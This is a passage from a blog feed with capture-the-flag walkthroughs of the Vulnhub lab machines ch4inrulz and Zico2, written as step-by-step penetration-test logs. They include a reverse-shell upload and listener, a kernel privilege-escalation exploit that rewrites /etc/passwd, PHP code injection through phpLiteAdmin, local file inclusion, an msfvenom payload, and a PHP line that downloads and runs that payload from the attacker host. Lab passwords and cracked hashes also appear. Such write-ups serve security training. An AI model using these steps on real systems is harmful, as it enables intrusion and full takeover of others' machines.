&lt;p&gt;After a few hours, I’ve found that &lt;code class=&quot;highlighter-rouge&quot;&gt;my uploads&lt;/code&gt; may be just &lt;code class=&quot;highlighter-rouge&quot;&gt;frank uploads&lt;/code&gt;. Still nothing, so after few more hours of fiddling, here we have &lt;code class=&quot;highlighter-rouge&quot;&gt;FRANKuploads&lt;/code&gt;. We can now get to our uploaded reverse shell with file api, while running a listener.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/var/www/development/uploader/FRANKuploads/php-reverse-shell.gif 10.0.0.14:8011/api/files_api.php

root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.14: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.14] 33643
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux
 05:38:18 up 46 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ whoami
www-data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;First flag is in the home direcotory of &lt;code class=&quot;highlighter-rouge&quot;&gt;frank&lt;/code&gt; user.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ cd home
$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 Apr 13 16:06 .
drwxr-xr-x 22 root  root  4096 Apr 13 16:10 ..
drwxr-xr-x  3 frank frank 4096 Apr 14 07:37 frank
$ cd frank
$ ls -la
total 36
drwxr-xr-x 3 frank frank 4096 Apr 14 07:37 .
drwxr-xr-x 3 root  root  4096 Apr 13 16:06 ..
-rw------- 1 frank frank   26 Jul 31 07:44 .bash_history
-rw-r--r-- 1 frank frank  220 Apr 13 16:06 .bash_logout
-rw-r--r-- 1 frank frank 3353 Apr 13 16:06 .bashrc
drwxr-xr-x 2 frank frank 4096 Apr 13 16:07 .cache
-rw-r--r-- 1 frank frank  675 Apr 13 16:06 .profile
-rw-r--r-- 1 frank frank    0 Apr 13 16:08 .sudo_as_admin_successful
-rw-r--r-- 1 frank frank   29 Apr 14 07:37 PE.txt
-rw-r--r-- 1 frank frank   33 Apr 14 07:36 user.txt
$ cat user.txt
4795aa2a9be22fac10e1c25794e75c1b&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we have to get to the higher privileges. During usual enumeration, I’ve noticed that the only unusal thing in this system is outdated kernel.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
www-data@ubuntu:/home/frank$ cat PE.txt
cat PE.txt
Try it as fast as you can ;)

www-data@ubuntu:/$ uname -a
uname -a
Linux ubuntu 2.6.35-19-generic #28-Ubuntu SMP Sun Aug 29 06:34:38 UTC 2010 x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we just have to exlpoit the system using &lt;a href=&quot;https://www.exploit-db.com/exploits/40839/&quot;&gt;this exploit&lt;/a&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# wget https://www.exploit-db.com/raw/40839/
--2018-08-19 11:49:45--  https://www.exploit-db.com/raw/40839/
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/plain]
Saving to: ‘index.html’

index.html          100%[===================&amp;gt;]   4.89K  --.-KB/s    in 0s      

2018-08-19 11:49:46 (43.5 MB/s) - ‘index.html’ saved [5006/5006]


root@kali:~# mv index.html exploit.c
root@kali:~# python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.0.0.14 - - [19/Aug/2018 11:51:08] &quot;GET /exploit.c HTTP/1.0&quot; 200 -

www-data@ubuntu:/tmp$ mv exploit.c dirty.c                
mv exploit.c dirty.c
www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt


www-data@ubuntu:/tmp$ ./dirty
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: test

Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: 7ffa136a2000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd


www-data@ubuntu:/tmp$ su firefart
su firefart
Password: test

firefart@ubuntu:/tmp# cd /root
cd /root
firefart@ubuntu:~# ls -la
ls -la
total 32
drwx------  4 firefart root 4096 2018-04-14 07:36 .
drwxr-xr-x 22 firefart root 4096 2018-04-13 16:10 ..
drwx------  2 firefart root 4096 2018-04-13 16:06 .aptitude
-rw-------  1 firefart root   82 2018-07-31 07:44 .bash_history
-rw-r--r--  1 firefart root 3106 2010-04-23 02:45 .bashrc
drwxr-xr-x  2 firefart root 4096 2018-04-14 07:32 .cache
-rw-r--r--  1 firefart root  140 2010-04-23 02:45 .profile
-rw-r--r--  1 firefart root   33 2018-04-14 07:36 root.txt
firefart@ubuntu:~# cat root.txt
cat root.txt
8f420533b79076cc99e9f95a1a4e5568&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
</description>
        <pubDate>Sun, 19 Aug 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/vulnhub-ch4inrulz/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-ch4inrulz/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Zico2</title>
        <description>&lt;p&gt;In this post we’re going to finish a quick machine from Vulnhub called &lt;strong&gt;Zico2&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Zico's Shop: A Boot2Root Machine intended to simulate a real world cenario

Disclaimer:

By using this virtual machine, you agree that in no event will I be liable for any loss or damage including without limitation, indirect or consequential loss or damage, or any loss or damage whatsoever arising from loss of data or profits arising out of or in connection with the use of this software.

TL;DR - You are about to load up a virtual machine with vulnerabilities. If something bad happens, it's not my fault.

Level: Intermediate

Goal: Get root and read the flag file

Description:

Zico is trying to build his website but is having some trouble in choosing what CMS to use. After some tries on a few popular ones, he decided to build his own. Was that a good idea?

Hint: Enumerate, enumerate, and enumerate!

Thanks to: VulnHub

Author: Rafael (@rafasantos5)

Doesn't work with VMware. Virtualbox only. &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@rafasantos5&quot;&gt;rafasantos5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/zico2-1,210/&quot;&gt;https://www.vulnhub.com/entry/zico2-1,210/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;As always, let’s start from the usual &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -A -T4 10.0.0.8
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-18 09:12 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating ARP Ping Scan at 09:12
Scanning 10.0.0.8 [1 port]
Completed ARP Ping Scan at 09:12, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:12
Completed Parallel DNS resolution of 1 host. at 09:12, 0.00s elapsed
Initiating SYN Stealth Scan at 09:12
Scanning 10.0.0.8 [1000 ports]
Discovered open port 111/tcp on 10.0.0.8
Discovered open port 22/tcp on 10.0.0.8
Discovered open port 80/tcp on 10.0.0.8
Completed SYN Stealth Scan at 09:12, 0.08s elapsed (1000 total ports)
Initiating Service scan at 09:12
Scanning 3 services on 10.0.0.8
Completed Service scan at 09:12, 6.08s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.8
NSE: Script scanning 10.0.0.8.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.25s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.01s elapsed
Nmap scan report for 10.0.0.8
Host is up (0.00071s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          40448/udp  status
|_  100024  1          48227/tcp  status
MAC Address: 08:00:27:98:69:CA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 199.638 days (since Sat Dec 30 16:53:24 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 10.0.0.8

NSE: Script Post-scanning.
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Initiating NSE at 09:12
Completed NSE at 09:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.350KB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;From the results, we can see three open ports - &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;. With that information we can continue enumeration on port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; and scan the website hosted on this machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# dirb http://10.0.0.8

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jul 18 09:13:22 2018
URL_BASE: http://10.0.0.8/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.8/ ----
+ http://10.0.0.8/cgi-bin/ (CODE:403|SIZE:284)                                 
==&amp;gt; DIRECTORY: http://10.0.0.8/css/                                            
==&amp;gt; DIRECTORY: http://10.0.0.8/dbadmin/                                        
==&amp;gt; DIRECTORY: http://10.0.0.8/img/                                            
+ http://10.0.0.8/index (CODE:200|SIZE:7970)                                   
+ http://10.0.0.8/index.html (CODE:200|SIZE:7970)                              
==&amp;gt; DIRECTORY: http://10.0.0.8/js/                                             
+ http://10.0.0.8/LICENSE (CODE:200|SIZE:1094)                                 
+ http://10.0.0.8/package (CODE:200|SIZE:789)                                  
+ http://10.0.0.8/server-status (CODE:403|SIZE:289)                            
+ http://10.0.0.8/tools (CODE:200|SIZE:8355)                                   
==&amp;gt; DIRECTORY: http://10.0.0.8/vendor/                                         
+ http://10.0.0.8/view (CODE:200|SIZE:0)                                       
                                                                               
---- Entering directory: http://10.0.0.8/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/dbadmin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Jul 18 09:13:27 2018
DOWNLOADED: 4612 - FOUND: 8&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Scanning with &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb&lt;/code&gt; shows interesting directory &lt;code class=&quot;highlighter-rouge&quot;&gt;dbadmin&lt;/code&gt;, let’s take a look at it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/zico2/dbadmin.png&quot; alt=&quot;Dbadmin&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Googling for the name of the service &lt;code class=&quot;highlighter-rouge&quot;&gt;phpLiteAdmin v1.9.3&lt;/code&gt; returned a &lt;a href=&quot;https://www.acunetix.com/vulnerabilities/web/phpliteadmin-default-password&quot;&gt;default password&lt;/a&gt;, with which we can log into the panel.&lt;/p&gt;

&lt;p&gt;While looking for information, I’ve noticed a table containg hashes of users.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.0.8/dbadmin/test_db.php?action=row_view&amp;amp;table=info

edit	delete	root	653F4B285089453FE00E2AAFAC573414	1
edit	delete	zico	96781A607F4E9F5F423AC01F0DAB0EBD	2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Being able to crack them, I decided to connect to &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, but with no luck.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;zico 96781A607F4E9F5F423AC01F0DAB0EBD	md5	zico2215@
root 653F4B285089453FE00E2AAFAC573414	md5	34kroot34&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Moving on with attack, we can use this &lt;a href=&quot;https://www.exploit-db.com/exploits/24044/&quot;&gt;exploit&lt;/a&gt; in order to execute commands. Steps are simple.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;We create a db named “share.php”.&lt;/li&gt;
  &lt;li&gt;Now create a new table in this database and insert a text field with the default value:
&lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In addition, in &lt;code class=&quot;highlighter-rouge&quot;&gt;view.php&lt;/code&gt; we have a LFI vulnerability allowing us to view any file in the system.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.0.8/view.php?page=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ntp:x:103:108::/home/ntp:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
statd:x:105:65534::/var/lib/nfs:/bin/false
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
zico:x:1000:1000:,,,:/home/zico:/bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let’s see if our code has executed.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.0.8/view.php?page=../../../usr/databases/share.php
SQLite format 3@ -â! ››c)tabletesttestCREATE TABLE 'test' ('text' INTEGER default 'www-data www-data') &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s working! Now we can see if &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; is installed in order to execute a reverse shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;?php echo(system(&quot;which nc&quot;))?&amp;gt;
SQLite format 3@  -â! áa%tabletesttestCREATE TABLE 'test' ('test' TEXT default '/bin/nc /bin/nc') &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And as it’s installed, let’s prepare the reverse tcp shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# msfvenom --platform Linux -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.4 LPORT=1337 -f elf -o exploit
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 911184 bytes
Final size of elf file: 911184 bytes
Saved as: exploit
root@kali:~# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we simply have to get it from our Kali machine and execute it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;?php system(&quot;cd /tmp;wget 10.0.0.4:8000/exploit; chmod +x exploit; ./exploit&quot;); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Viewing this website just the same way as previously got us a reverse shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# msfconsole
                                                  \../
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v4.16.65-dev                         ]
+ -- --=[ 1780 exploits - 1016 auxiliary - 308 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf &amp;gt; use multi/handler
semsf exploit(multi/handler) &amp;gt; set LPORT 1337
LPORT =&amp;gt; 1337
msf exploit(multi/handler) &amp;gt; run

[*] Started reverse TCP handler on 10.0.0.4:1337 
[*] Sending stage (179779 bytes) to 10.0.0.8
[*] Meterpreter session 3 opened (10.0.0.4:1337 -&amp;gt; 10.0.0.8:54453) at 2018-07-18 11:49:29 -0400

meterpreter &amp;gt; shell
Process 1396 created.
Channel 1 created.
cd /
python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we just have to escalate to another user. I decided to firstly, check out the home directory, which will show what other users are on the system.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;www-data@zico:/$ cd /home
cd /home
www-data@zico:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Jun  8  2017 .
drwxr-xr-x 24 root root 4096 Jun  1  2017 ..
drwxr-xr-x  6 zico zico 4096 Jun 19  2017 zico
www-data@zico:/home$ cd zico
cd zico
www-data@zico:/home/zico$ ls -la
ls -la
total 9244
drwxr-xr-x  6 zico zico    4096 Jun 19  2017 .
drwxr-xr-x  3 root root    4096 Jun  8  2017 ..
-rw-------  1 zico zico     912 Jun 19  2017 .bash_history
-rw-r--r--  1 zico zico     220 Jun  8  2017 .bash_logout
-rw-r--r--  1 zico zico    3486 Jun  8  2017 .bashrc
-rw-r--r--  1 zico zico     675 Jun  8  2017 .profile
drw-------  2 zico zico    4096 Jun  8  2017 .ssh
-rw-------  1 zico zico    3509 Jun 19  2017 .viminfo
-rw-rw-r--  1 zico zico  504646 Jun 14  2017 bootstrap.zip
drwxrwxr-x 18 zico zico    4096 Jun 19  2017 joomla
drwxrwxr-x  6 zico zico    4096 Aug 19  2016 startbootstrap-business-casual-gh-pages
-rw-rw-r--  1 zico zico      61 Jun 19  2017 to_do.txt
drwxr-xr-x  5 zico zico    4096 Jun 19  2017 wordpress
-rw-rw-r--  1 zico zico 8901913 Jun 19  2017 wordpress-4.8.zip
-rw-rw-r--  1 zico zico    1194 Jun  8  2017 zico-history.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s a lot of files to look at. Let’s start with &lt;code class=&quot;highlighter-rouge&quot;&gt;to_do.txt&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;www-data@zico:/home/zico$ cat to_do.txt
cat to_do.txt

try list:
- joomla
- bootstrap (+phpliteadmin)
- wordpress&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So &lt;code class=&quot;highlighter-rouge&quot;&gt;zico&lt;/code&gt; user tried different CMSs. We can check what’s inside this directories, starting from Wordpress as it’s the one that I’m most familiar.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;www-data@zico:/home/zico$ cd wordpress
cd wordpress
www-data@zico:/home/zico/wordpress$ cat wp-config.php
cat wp-config.php
&amp;lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to &quot;wp-config.php&quot; and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'zico');

/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');

/** MySQL hostname */
define('DB_HOST', 'zico');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'put your unique phrase here');
define('SECURE_AUTH_KEY',  'put your unique phrase here');
define('LOGGED_IN_KEY',    'put your unique phrase here');
define('NONCE_KEY',        'put your unique phrase here');
define('AUTH_SALT',        'put your unique phrase here');
define('SECURE_AUTH_SALT', 'put your unique phrase here');
define('LOGGED_IN_SALT',   'put your unique phrase here');
define('NONCE_SALT',       'put your unique phrase here');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have a password to the database. With that, we can try to log in to &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; server.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh zico@10.0.0.8
zico@10.0.0.8's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

zico@zico:~$ ls -la
